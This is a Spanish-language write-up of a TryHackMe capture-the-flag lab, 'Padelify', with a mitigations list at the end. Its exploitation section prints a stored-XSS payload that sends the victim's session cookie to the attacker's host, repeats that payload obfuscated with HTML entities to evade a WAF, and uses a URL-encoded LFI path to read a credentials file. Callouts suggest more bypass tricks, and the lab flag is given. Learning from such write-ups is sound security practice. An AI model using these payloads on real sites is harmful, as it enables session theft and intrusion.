---
title: "Padelify"
platform: "TryHackMe"
os: "Linux"
difficulty: "Medium"
ip: "10.67.149.164"
slug: "padelify"
author: "Z4k7"
date: "2026-03-21"
year: "2026"
status: "pwned"
tags:
  - "XSS"
  - "Cookie"
  - "HttpOnly"
  - "redteam"
  - "WAF"
  - "LFI"
techniques:
  - "XSS"
  - "Cookie"
  - "HttpOnly"
  - "redteam"
  - "WAF"
tools:
  - "[[Nmap]]"
  - "[[Feroxbuster]]"
  - "[[ffuf]]"
  - "[[Python HTTP Server]]"
flags_list:
  - label: "Flag"
    value: "THM{Logged_1n_Adm1n001}"
summary: "Lab de TryHackMe categoría RedTeam. Aplicación web PHP sobre Apache 2.4.58 / Ubuntu con panel de administración de torneo de pádel. Cadena de ataque: cookie PHPSESSID sin flag HttpOnly → XSS Almacenada con ofuscación HTML entities para bypass de WAF → robo de cookie de moderador → acceso al panel → LFI con URL encoding para bypass WAF → lectura de config/app.conf con credenciales admin → Flag.  ---"
steps:

  - id: "recon_1"
    num: "01"
    title: "Reconocimiento"
    content:
      - kind: "note"
        text: |
          Validamos si contamos con conexión a la ip por medio de un `ping`
      - kind: "code"
        lang: "BASH"
        code: |
          ping -c 6 10.65.188.120
          PING 10.65.188.120 (10.65.188.120) 56(84) bytes of data.
          64 bytes from 10.65.188.120: icmp_seq=1 ttl=62 time=74.7 ms
          64 bytes from 10.65.188.120: icmp_seq=2 ttl=62 time=79.9 ms
          64 bytes from 10.65.188.120: icmp_seq=3 ttl=62 time=82.7 ms
          64 bytes from 10.65.188.120: icmp_seq=4 ttl=62 time=78.6 ms
          64 bytes from 10.65.188.120: icmp_seq=5 ttl=62 time=76.0 ms
          64 bytes from 10.65.188.120: icmp_seq=6 ttl=62 time=76.3 ms
          
          --- 10.65.188.120 ping statistics ---
          6 packets transmitted, 6 received, 0% packet loss, time 5040ms
          rtt min/avg/max/mdev = 74.700/78.054/82.726/2.713 ms
      - kind: "note"
        text: |
          Se recomienda aplicar el name para la ip asignada. El name del dominio se encuentra en el objetivo del laboratorio.
      - kind: "code"
        lang: "BASH"
        code: |
          echo "10.65.188.120 padelify.thm" | sudo tee -a /etc/hosts
          10.65.188.120 padelify.thm
      - kind: "note"
        text: |
          Se valida que contamos con el hosts de la ip — así podemos interactuar mejor con el entorno. Consultamos acceso desde el navegador con el nombre del dominio creado.
      - kind: "image"
        src: "assets/images/Padelify/file-20260313192519868.jpg"
        caption: "Evidencia técnica"
      - kind: "note"
        text: |
          Iniciamos con un escaneo completo de puertos para identificar servicios expuestos en la máquina objetivo.
      - kind: "code"
        lang: "BASH"
        code: |
          nmap -sVC -O -T4 -v padelify.thm
          
          PORT   STATE SERVICE VERSION
          22/tcp open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.14 (Ubuntu Linux; protocol 2.0)
          | ssh-hostkey:
          |   256 37:75:ca:4c:62:aa:19:b9:82:f2:a6:7b:c3:a0:d3:63 (ECDSA)
          |_  256 eb:e4:c2:c0:8a:f6:c0:cf:74:66:07:2c:ef:98:c8:90 (ED25519)
          80/tcp open  http    Apache httpd 2.4.58 ((Ubuntu))
          | http-methods:
          |_  Supported Methods: GET HEAD POST OPTIONS
          |_http-title: Padelify - Tournament Registration
          |_http-server-header: Apache/2.4.58 (Ubuntu)
          | http-cookie-flags:
          |   /:
          |     PHPSESSID:
          |_      httponly flag not set
      - kind: "bullet"
        text: "Puerto 80 → Apache httpd 2.4.58 (Ubuntu)"
      - kind: "bullet"
        text: "Puerto 22 → OpenSSH 9.6p1 Ubuntu"
      - kind: "note"
        text: |
          Dato crítico: `PHPSESSID` con `httponly flag not set` — la cookie es accesible desde JavaScript.
      - kind: "callout"
        type: "tip"
        label: "Agente"
        text: "El TTL de 62 confirma 2 saltos entre tú y el objetivo (64 - 2 = 62), típico de VPN en THM. El hallazgo crítico de nmap es `httponly flag not set` en PHPSESSID: esto significa que la cookie es accesible desde JavaScript — condición necesaria para que XSS Almacenada sea explotable para robo de sesión. Sin este flag el ataque no funcionaría aunque existiera XSS. Siguiente pregunta: ¿también verificaste si el flag `Secure` estaba ausente? Si viaja por HTTP en claro, podrías capturarla también con un MITM en red local."

  - id: "enum_1"
    num: "02"
    title: "Enumeración"
    content:
      - kind: "note"
        text: |
          Entramos a validar si el dominio puede contar con directorios o subdominios que validen información adicional.
      - kind: "code"
        lang: "BASH"
        code: |
          feroxbuster -u http://padelify.thm/ -H "User-Agent: Mozilla/5.0"
          
          301  http://padelify.thm/js
          301  http://padelify.thm/css
          301  http://padelify.thm/logs
          302  http://padelify.thm/register.php => index.php
          200  http://padelify.thm/login.php
          301  http://padelify.thm/config
          200  http://padelify.thm/logs/error.log
          301  http://padelify.thm/javascript
      - kind: "note"
        text: |
          Validamos con otra herramienta para obtener otros directorios:
      - kind: "code"
        lang: "BASH"
        code: |
          ffuf -u http://padelify.thm/FUZZ -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories-lowercase.txt -H "User-Agent: Mozilla/5.0"
          
          css      [Status: 301]
          js       [Status: 301]
          logs     [Status: 301]
          config   [Status: 301]
      - kind: "note"
        text: |
          Verificando los directorios encontramos `http://padelify.thm/config/app.conf` — este directorio está protegido por el WAF.
      - kind: "image"
        src: "assets/images/Padelify/file-20260313204216817.jpg"
        caption: "WAF"
      - kind: "note"
        text: |
          Consultamos la interfaz donde el usuario puede enviar un registro al sistema, pendiente de aprobación por usuario con perfil de admisión.
      - kind: "image"
        src: "assets/images/Padelify/file-20260313204508213.jpg"
        caption: "Registro"
      - kind: "note"
        text: |
          Validando en el navegador evidenciamos que `HttpOnly` no está seteado — es posible obtener la cookie mediante XSS Almacenada.
      - kind: "callout"
        type: "tip"
        label: "Agente"
        text: "Dos herramientas de fuzzing encontraron los mismos resultados — bien hecho para validar. Lo que faltó revisar: `logs/error.log` estaba accesible con 200. Los error logs de Apache frecuentemente filtran rutas internas, nombres de archivos PHP, parámetros que fallaron, o stack traces. En un engagement real ese archivo es lectura obligatoria antes de continuar. ¿Qué encontraste ahí?"

  - id: "exploit_1"
    num: "03"
    title: "Explotación"
    content:
      - kind: "note"
        text: |
          Ponemos en modo escucha por el puerto 8989:
      - kind: "code"
        lang: "PYTHON"
        code: |
          python3 -m http.server 8989
          Serving HTTP on 0.0.0.0 port 8989 (http://0.0.0.0:8989/) ...
      - kind: "note"
        text: |
          Aplicamos el siguiente script para capturar la cookie del usuario víctima:
      - kind: "code"
        lang: "JAVASCRIPT"
        code: |
          <script>
          fetch(fetch('http://192.168.132.130:9090/?'+document.cookie))
          </script>
      - kind: "note"
        text: |
          Se envía el formulario con el script anterior y salta el WAF.
      - kind: "image"
        src: "assets/images/Padelify/file-20260313205418153.jpg"
        caption: "Evidencia técnica"
      - kind: "note"
        text: |
          Tratamos de ofuscar el código para saltar el WAF usando HTML entities encoding:
      - kind: "code"
        lang: "BASH"
        code: |
          &lt;&#98;&#111;&#100;&#121;&#32;&#111;&#110;&#108;&#111;&#97;&#100;&equals;&#102;&#101;&#116;&#99;&#104;&lpar;&apos;&#104;&#116;&#116;&#112;&colon;&sol;&sol;&#49;&#57;&#50;&period;&#49;&#54;&#56;&period;&#49;&#51;&#50;&period;&#49;&#51;&#48;&colon;&#57;&#48;&#57;&#48;&quest;&apos;&plus;&#100;&#111;&#99;&#117;&#109;&#101;&#110;&#116;&period;&#99;&#111;&#111;&#107;&#105;&#101;&rpar;&gt;
      - kind: "note"
        text: |
          Capturamos la cookie de la víctima:
      - kind: "image"
        src: "assets/images/Padelify/file-20260314124441676.jpg"
        caption: "Evidencia técnica"
      - kind: "callout"
        type: "tip"
        label: "Agente"
        text: "El WAF bloqueó el payload directo porque detectó palabras clave como `<script>`, `fetch`, `document.cookie`. La ofuscación con HTML entities funciona porque el WAF analiza el input en su forma raw pero el navegador lo decodifica antes de ejecutarlo — clásica discrepancia de parsing. Otras técnicas de bypass que deberías documentar: `<img src=x onerror=...>`, `<svg onload=...>`, `javascript:` URI, y encoding en Base64 con `eval(atob(...))`. Cada WAF tiene sus gaps — tener un repertorio de bypasses es lo que separa a un junior de un senior."

  - id: "exploit"
    num: "04"
    title: "Acceso Inicial"
    content:
      - kind: "note"
        text: |
          Luego de ingresar la cookie ya contamos con el usuario moderador que acepta los nuevos registros.
      - kind: "image"
        src: "assets/images/Padelify/file-20260314124737599.jpg"
        caption: "Evidencia técnica"
      - kind: "note"
        text: |
          Validamos los directorios disponibles — contamos con un directorio llamado Live.
      - kind: "image"
        src: "assets/images/Padelify/file-20260314124833608.jpg"
        caption: "Evidencia técnica"
      - kind: "note"
        text: |
          Intentamos aplicar LFI con `../../../../../etc/passwd` — el WAF lo bloquea. Recordamos el directorio `config/app.conf` — acceso directo también bloqueado por WAF.
      - kind: "image"
        src: "assets/images/Padelify/file-20260314125404333.jpg"
        caption: "WAF"
      - kind: "note"
        text: |
          Enviamos el directorio mediante URL encoding: `config%2Fapp%2Econf`
      - kind: "image"
        src: "assets/images/Padelify/file-20260314125749963.jpg"
        caption: "Evidencia técnica"
      - kind: "note"
        text: |
          Contamos con información relevante para acceder a la cuenta administrador.
      - kind: "image"
        src: "assets/images/Padelify/file-20260314125941671.jpg"
        caption: "Evidencia técnica"
      - kind: "callout"
        type: "tip"
        label: "Agente"
        text: "El bypass con URL encoding (`%2F` = `/`, `%2E` = `.`) funcionó porque el WAF comparaba rutas en su forma decodificada pero el servidor las procesaba codificadas — otra discrepancia de parsing, mismo principio que el XSS. En LFI también puedes probar: double encoding (`%252F`), null byte (`%00`), path truncation, y wrappers PHP como `php://filter/convert.base64-encode/resource=config/app.conf`."

  - id: "flag_01"
    type: "flag"
    flag_items:
      - label: "Flag"
        value: "THM{Logged_1n_Adm1n001}"

  - id: "flag_01_post"
    num: ""
    title: "Post Flag"
    content:
      - kind: "note"
        text: |
          ---

lessons:
  - 'La ausencia del flag `HttpOnly` en cookies de sesión es una vulnerabilidad crítica que habilita robo de sesión vía XSS'
  - 'Los WAF pueden bypassearse explotando discrepancias de parsing entre el WAF y el servidor/navegador'
  - 'HTML entities encoding es una técnica efectiva para ofuscar payloads XSS contra WAFs basados en patrones'
  - 'URL encoding permite acceder a recursos bloqueados por WAF que comparan rutas en formato decodificado'
  - 'Los archivos de configuración expuestos (`app.conf`) son objetivos de alto valor — siempre intentar encoding alternativo cuando el acceso directo está bloqueado'
mitigation:
  - 'Establecer el flag `HttpOnly` en todas las cookies de sesión para prevenir acceso desde JavaScript'
  - 'Implementar el flag `Secure` para forzar transmisión de cookies solo por HTTPS'
  - 'Configurar el WAF para normalizar y decodificar input (URL decode, HTML entity decode) antes de aplicar reglas'
  - 'Restringir acceso a directorios de configuración mediante `.htaccess` o permisos de sistema de archivos'
  - 'Implementar validación de Content Security Policy (CSP) para limitar dominios permitidos en `fetch` y `script-src`'
  - 'No exponer logs de aplicación (`error.log`) públicamente'
---
